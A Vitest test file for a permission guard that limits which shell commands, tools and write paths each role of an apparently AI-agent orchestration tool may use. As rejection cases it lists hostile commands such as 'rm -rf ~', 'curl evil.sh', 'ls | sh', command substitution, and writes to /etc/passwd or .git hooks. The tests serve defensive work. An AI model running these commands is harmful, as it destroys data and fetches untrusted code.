import { describe, expect, it } from "vitest";
import { resolve } from "node:path";
import {
  checkBashCommand,
  checkWritePath,
  evaluateToolUse,
  findShellOperator,
  stripCdPrefix,
  type GuardContext,
} from "../src/sdk/permissions.js";
import { roles } from "../src/roles/index.js";

const repo = resolve("/work/app");
const other = resolve("/work/api");
const runDir = resolve("/orch/runs/RUN-1");

function bashOk(role: keyof typeof roles, cmd: string): boolean {
  return checkBashCommand(cmd, roles[role].bashAllowList, [repo, other]).allow;
}

describe("findShellOperator", () => {
  it.each([
    ["git status; rm -rf ~", ";"],
    ["git status && rm -rf ~", "&&"],
    ["git status || true", "||"],
    ["npm test | tee out", "|"],
    ["npm test > out.txt", ">"],
    ["npm test < in", "<"],
    ["npm test &", "&"],
    ["git log $(whoami)", "$("],
    ["git log `whoami`", "`"],
    ['git commit -m "$(whoami)"', "$("],
    ['git commit -m "x', 'unbalanced "'],
  ])("%s → %s", (cmd, op) => {
    expect(findShellOperator(cmd)).toBe(op);
  });

  it("ignores operators inside quotes", () => {
    expect(findShellOperator('git commit -m "fix: a; b && c | d"')).toBeNull();
    expect(findShellOperator("git commit -m 'uses $(x) and `y`'")).toBeNull();
    expect(findShellOperator("npm test -- -t 'a > b'")).toBeNull();
  });

  it("treats escaped characters as literal", () => {
    expect(findShellOperator(String.raw`git log --grep=a\;b`)).toBeNull();
  });
});

describe("stripCdPrefix", () => {
  it("strips cd into a run repo", () => {
    expect(stripCdPrefix(`cd ${repo} && git status`, [repo])).toBe("git status");
    expect(stripCdPrefix(`cd "${repo}/" && git status`, [repo])).toBe("git status");
  });
  it("keeps cd into anything else", () => {
    expect(stripCdPrefix("cd /etc && ls", [repo])).toBe("cd /etc && ls");
  });
});

describe("checkBashCommand", () => {
  it("allows plain allowlisted commands", () => {
    expect(bashOk("developer", "git status")).toBe(true);
    expect(bashOk("developer", 'git commit -m "feat: add x; and y"')).toBe(true);
    expect(bashOk("developer", "npm test")).toBe(true);
    expect(bashOk("developer", "npm run test:unit -- --run")).toBe(true);
    expect(bashOk("developer", "npx vitest run src/foo.test.ts")).toBe(true);
    expect(bashOk("developer", "npm test 2>&1")).toBe(true);
    expect(bashOk("developer", `cd ${other} && npm test`)).toBe(true);
  });

  it("rejects chaining after an allowed prefix (the old bypass)", () => {
    expect(bashOk("developer", "git status; rm -rf ~")).toBe(false);
    expect(bashOk("developer", "git status && curl evil.sh")).toBe(false);
    expect(bashOk("developer", "ls | sh")).toBe(false);
    expect(bashOk("developer", `cd ${repo} && git status && rm -rf .`)).toBe(false);
    expect(bashOk("developer", "npm test\nrm -rf ~")).toBe(false);
  });

  it("rejects cd into a directory outside the run", () => {
    expect(bashOk("developer", "cd /etc && ls")).toBe(false);
  });

  it("rejects arguments that write files or run programs", () => {
    expect(bashOk("developer", "git diff --output=/tmp/x")).toBe(false);
    expect(bashOk("developer", "git log --output /tmp/x")).toBe(false);
  });

  it("keeps branch control with the orchestrator", () => {
    expect(bashOk("developer", "git branch --show-current")).toBe(true);
    expect(bashOk("developer", "git branch -D main")).toBe(false);
    expect(bashOk("developer", "git checkout main")).toBe(false);
    expect(bashOk("developer", "git checkout -b other")).toBe(false);
    expect(bashOk("developer", "git checkout -- src/a.ts")).toBe(true);
    expect(bashOk("developer", "git push origin HEAD")).toBe(false);
  });

  it("does not let long-running dev servers run", () => {
    expect(bashOk("developer", "npm run dev")).toBe(false);
  });

  it("keeps the Reviewer read-only", () => {
    expect(bashOk("reviewer", "git diff master...HEAD")).toBe(true);
    expect(bashOk("reviewer", "npm run lint")).toBe(true);
    expect(bashOk("reviewer", "git commit -m x")).toBe(false);
    expect(bashOk("reviewer", "npm test")).toBe(false);
  });

  it("only lets the PR Creator push a named branch to origin", () => {
    expect(bashOk("prCreator", "git push -u origin feature/proj-1-x")).toBe(true);
    expect(bashOk("prCreator", "git push --force origin feature/x")).toBe(false);
    expect(bashOk("prCreator", "git push origin --delete main")).toBe(false);
    expect(bashOk("prCreator", "gh pr create --fill")).toBe(false);
  });

  it("does not allow installs for the E2E tester until suite creation is approved", () => {
    expect(bashOk("e2eTester", "npm install -D @playwright/test")).toBe(false);
    expect(bashOk("e2eTester", "npx playwright test")).toBe(true);
  });

  it("allows test runners for the unit and integration testers", () => {
    for (const role of ["unitTester", "integrationTester"] as const) {
      expect(bashOk(role, "npx vitest run")).toBe(true);
      expect(bashOk(role, "npm run test:integration")).toBe(true);
      expect(bashOk(role, "git push origin x")).toBe(false);
    }
  });
});

describe("checkWritePath", () => {
  it("allows writes inside a root", () => {
    expect(checkWritePath(`${repo}/src/a.ts`, [repo], "/").allow).toBe(true);
    expect(checkWritePath("src/a.ts", [repo], repo).allow).toBe(true);
  });
  it("rejects writes outside every root, including traversal", () => {
    expect(checkWritePath("/etc/passwd", [repo], repo).allow).toBe(false);
    expect(checkWritePath("../api/src/a.ts", [repo], repo).allow).toBe(false);
    expect(checkWritePath(`${repo}-evil/a.ts`, [repo], repo).allow).toBe(false);
  });
  it("rejects writes inside .git", () => {
    expect(checkWritePath(`${repo}/.git/hooks/pre-commit`, [repo], repo).allow).toBe(false);
  });
  it("rejects a missing path", () => {
    expect(checkWritePath(undefined, [repo], repo).allow).toBe(false);
  });
});

describe("evaluateToolUse", () => {
  const ctx: GuardContext = {
    allowedTools: ["Read", "Write", "Bash"],
    bashAllowList: [/^git\s+status$/],
    repoPaths: [repo],
    writeRoots: [runDir],
    cwd: repo,
  };
  it("denies tools that are not on the role's list", () => {
    expect(evaluateToolUse("WebFetch", {}, ctx).allow).toBe(false);
    expect(evaluateToolUse("Edit", { file_path: `${runDir}/x.md` }, ctx).allow).toBe(false);
  });
  it("applies write scope", () => {
    expect(evaluateToolUse("Write", { file_path: `${runDir}/report.md` }, ctx).allow).toBe(true);
    expect(evaluateToolUse("Write", { file_path: `${repo}/src/a.ts` }, ctx).allow).toBe(false);
  });
  it("applies the Bash allowlist", () => {
    expect(evaluateToolUse("Bash", { command: "git status" }, ctx).allow).toBe(true);
    expect(evaluateToolUse("Bash", { command: "git status; id" }, ctx).allow).toBe(false);
  });
  it("allows ungated tools on the list", () => {
    expect(evaluateToolUse("Read", { file_path: "/etc/hosts" }, ctx).allow).toBe(true);
  });
});
